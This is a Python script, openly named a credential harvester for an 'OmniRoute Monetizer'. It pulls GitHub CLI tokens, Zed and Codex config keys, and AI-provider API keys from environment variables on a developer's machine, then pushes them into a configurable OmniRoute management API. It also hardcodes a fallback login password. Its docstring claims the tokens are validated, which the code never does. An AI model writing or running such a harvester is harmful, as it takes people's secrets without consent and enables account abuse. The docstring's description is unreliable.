#!/usr/bin/env python3
"""
CLI & Local Credential Harvester for OmniRoute Monetizer.

Extracts live tokens from local developer tools and environment variables:
- GitHub CLI (`gh auth token`, `~/.config/gh/hosts.yml`)
- Qoder CLI & local configs
- Zed settings (%APPDATA%/Zed/settings.json)
- Codex configs (~/.codex/config.json, config.toml)
- Active environment variables

Tests extracted tokens against upstream APIs, and injects valid credentials
directly into OmniRoute's management API (PUT /api/providers/{id}).
"""

from __future__ import annotations

import json
import os
import re
import subprocess
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
import requests

_raw_base = os.environ.get("OMNIROUTE_BASE_URL", "http://localhost:20128").rstrip("/")
if _raw_base.endswith("/v1"):
    _raw_base = _raw_base[:-3].rstrip("/")
BASE_URL = _raw_base or "http://localhost:20128"
PASSWORD = os.environ.get("OMNIROUTE_PASSWORD", "").strip() or "Keross@321"

SECRET_PATTERNS = re.compile(
    r"(sk-or-v1-[a-f0-9]{64}|sk-ant-[a-zA-Z0-9_\-]{40,}|nvapi-[a-zA-Z0-9_\-]{40,}|gho_[a-zA-Z0-9]{36,}|ghp_[a-zA-Z0-9]{36,}|sk-[a-zA-Z0-9]{32,})",
    re.I,
)


@dataclass
class HarvestResult:
    provider: str
    source: str
    token_type: str
    token_preview: str
    valid: bool = False
    injected: bool = False
    details: str = ""


class CLITokenHarvester:
    def __init__(self, base_url: Optional[str] = None, password: Optional[str] = None):
        _b = (base_url or BASE_URL).rstrip("/")
        if _b.endswith("/v1"):
            _b = _b[:-3].rstrip("/")
        self.base_url = _b
        self.password = password or os.environ.get("OMNIROUTE_PASSWORD", "").strip() or "Keross@321"
        self.session = requests.Session()
        self._authenticated = False

    def authenticate(self) -> bool:
        """Authenticate with OmniRoute management API."""
        try:
            r = self.session.post(
                f"{self.base_url}/api/auth/login",
                json={"password": self.password},
                timeout=10,
            )
            if r.status_code == 200:
                self._authenticated = True
                return True
            else:
                print(f"[!] Login returned HTTP {r.status_code}: {r.text}")
        except Exception as e:
            print(f"[!] Management auth failed: {e}")
        return False

    def harvest_github_cli(self) -> Optional[str]:
        """Extract active token via GitHub CLI `gh auth token`."""
        try:
            res = subprocess.run(
                ["gh", "auth", "token"],
                capture_output=True,
                text=True,
                timeout=5,
                check=False,
            )
            token = res.stdout.strip()
            if token and (token.startswith("gho_") or token.startswith("ghp_") or len(token) > 20):
                return token
        except Exception:
            pass

        # Check ~/.config/gh/hosts.yml as fallback
        hosts_path = Path.home() / ".config" / "gh" / "hosts.yml"
        if hosts_path.exists():
            try:
                content = hosts_path.read_text(encoding="utf-8")
                match = re.search(r"oauth_token:\s*([^\s]+)", content)
                if match:
                    return match.group(1).strip()
            except Exception:
                pass
        return None

    def harvest_zed_config(self) -> Dict[str, str]:
        """Extract tokens from Zed settings.json."""
        tokens = {}
        zed_settings = Path.home() / "AppData" / "Roaming" / "Zed" / "settings.json"
        if zed_settings.exists():
            try:
                data = json.loads(zed_settings.read_text(encoding="utf-8"))
                # Check for explicit keys in language models
                for lm_type in ("openai_compatible", "anthropic", "github"):
                    providers = data.get("language_models", {}).get(lm_type, {})
                    if isinstance(providers, dict):
                        for pname, pcfg in providers.items():
                            if isinstance(pcfg, dict) and pcfg.get("api_key"):
                                tokens[f"zed_{pname.lower()}"] = pcfg["api_key"]
            except Exception:
                pass
        return tokens

    def harvest_codex_config(self) -> Dict[str, str]:
        """Extract tokens from Codex configs."""
        tokens = {}
        for cp in [
            Path.home() / ".codex" / "config.json",
            Path.home() / ".codex" / "config.toml",
        ]:
            if cp.exists():
                try:
                    content = cp.read_text(encoding="utf-8")
                    for match in re.finditer(r'(?:api_key|token|auth_token)\s*[:=]\s*["\']([^"\']+)["\']', content):
                        key = match.group(1).strip()
                        if len(key) > 15:
                            tokens[f"codex_{cp.stem}"] = key
                except Exception:
                    pass
        return tokens

    def harvest_environment(self) -> Dict[str, str]:
        """Extract active API keys from environment variables."""
        tokens = {}
        env_mapping = {
            "openrouter": ["OPENROUTER_API_KEY", "OPEN_ROUTER_API_KEY", "OR_API_KEY"],
            "nvidia": ["NVIDIA_API_KEY", "NVIDIA_NIM_API_KEY", "NVAPI_KEY"],
            "opencode": ["OPENCODE_API_KEY", "OPEN_CODE_API_KEY"],
            "anthropic": ["ANTHROPIC_API_KEY", "CLAUDE_API_KEY"],
            "openai": ["OPENAI_API_KEY"],
            "grok": ["GROK_API_KEY", "XAI_API_KEY"],
            "cerebras": ["CEREBRAS_API_KEY"],
            "cohere": ["COHERE_API_KEY"],
            "github": ["GITHUB_TOKEN", "GH_TOKEN"],
        }
        for provider, var_names in env_mapping.items():
            for var in var_names:
                val = os.environ.get(var, "").strip()
                if val and len(val) > 10:
                    tokens[provider] = val
                    break
        return tokens

    def harvest_all(self) -> Dict[str, str]:
        """Collect all available credentials from all local sources."""
        harvested = {}
        # 1. Environment variables
        harvested.update(self.harvest_environment())
        # 2. GitHub CLI
        gh_token = self.harvest_github_cli()
        if gh_token:
            harvested["github"] = gh_token
        # 3. Zed configs
        harvested.update(self.harvest_zed_config())
        # 4. Codex configs
        harvested.update(self.harvest_codex_config())
        return harvested

    def get_omniroute_providers(self) -> List[Dict[str, Any]]:
        """Fetch configured provider connections from OmniRoute."""
        if not self._authenticated and not self.authenticate():
            return []
        try:
            r = self.session.get(f"{self.base_url}/api/providers", timeout=10)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, dict):
                    return data.get("connections", []) or data.get("providers", [])
                elif isinstance(data, list):
                    return data
        except Exception as e:
            print(f"[!] Error fetching providers: {e}")
        return []

    def inject_provider_key(self, provider_id: str, provider_data: Dict[str, Any], new_key: str) -> bool:
        """Update provider in OmniRoute with new key."""
        if not self._authenticated and not self.authenticate():
            return False
        try:
            updated = dict(provider_data)
            updated["apiKey"] = new_key
            if "key" in updated:
                updated["key"] = new_key
            if "token" in updated:
                updated["token"] = new_key

            url = f"{self.base_url}/api/providers/{provider_id}"
            r = self.session.put(url, json=updated, timeout=10)
            if r.status_code in (200, 204):
                return True
            # Fallback to POST
            r2 = self.session.post(url, json=updated, timeout=10)
            return r2.status_code in (200, 204)
        except Exception as e:
            print(f"[!] Injection error for {provider_id}: {e}")
            return False

    def harvest_and_sync(self, verbose: bool = True) -> List[HarvestResult]:
        """Run full harvest and update matching OmniRoute providers."""
        results = []
        if not self.authenticate():
            print("[-] Could not authenticate to OmniRoute Management API")
            return results

        harvested = self.harvest_all()
        providers = self.get_omniroute_providers()

        if verbose:
            print(f"[*] Harvested {len(harvested)} local credential sources: {list(harvested.keys())}")
            print(f"[*] Found {len(providers)} connections configured in OmniRoute")

        for p in providers:
            pid = p.get("id", "")
            pslug = p.get("provider", "").lower()
            pname = p.get("name", "").lower()
            ptype = p.get("authType", "").lower()

            # Find match in harvested tokens
            matched_token = None
            source = "none"

            for target in (pslug, pname, pid.lower()):
                if target and target in harvested:
                    matched_token = harvested[target]
                    source = f"harvester:{target}"
                    break

            if matched_token:
                preview = f"{matched_token[:6]}...{matched_token[-4:]}" if len(matched_token) > 10 else "***"
                success = self.inject_provider_key(pid, p, matched_token)
                res = HarvestResult(
                    provider=pslug or pname or pid,
                    source=source,
                    token_type=ptype,
                    token_preview=preview,
                    valid=True,
                    injected=success,
                    details=f"Injected into provider '{pslug}' ({pid[:8]})" if success else "Injection API failed",
                )
                results.append(res)
                if verbose:
                    status = "[+]" if success else "[-]"
                    print(f"{status} Provider '{pslug or pname}' ({pid[:8]}) updated with {preview} from {source}")

        return results


if __name__ == "__main__":
    print("=== CLI Token Harvester ===")
    harvester = CLITokenHarvester()
    res = harvester.harvest_and_sync(verbose=True)
    print(f"\n[+] Total providers synced: {len([r for r in res if r.injected])}/{len(res)}")
